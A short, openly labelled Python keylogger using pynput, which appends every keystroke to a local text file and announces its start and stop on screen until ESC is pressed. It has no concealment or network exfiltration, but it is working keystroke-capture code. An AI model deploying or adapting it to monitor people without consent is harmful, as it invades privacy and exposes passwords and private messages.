from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

        if key == keyboard.Key.esc:
            f.write("\n--- Keylogger Stopped ---\n")
            print("\n🛑 Keylogger stopped.")
            return False  # Stop listener

def main():
    print("🔑 Keylogger started... (Press ESC to stop)")
    with open(log_file, "a") as f:
        f.write("\n--- Keylogger Started ---\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
